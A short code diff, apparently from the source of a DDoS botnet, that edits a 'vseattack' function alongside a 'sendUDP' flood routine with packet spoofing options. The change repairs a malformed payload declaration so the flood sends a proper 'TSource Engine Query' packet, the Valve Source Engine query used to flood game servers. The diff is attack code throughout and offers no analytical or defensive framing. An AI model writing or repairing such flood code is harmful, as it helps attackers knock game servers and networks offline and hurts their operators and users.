@@ -1172,9 +1172,8 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int pack
 }
 void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
 {
-    char *vse_payload;
-    int vse_payload_len;
-    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;
+    char vse_payload[] = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
+        int vse_payload_len = sizeof(vse_payload) - 1;  // excludes null terminator
 	struct sockaddr_in dest_addr;
 	dest_addr.sin_family = AF_INET;
 	if(port == 0) dest_addr.sin_port = rand_cmwc();
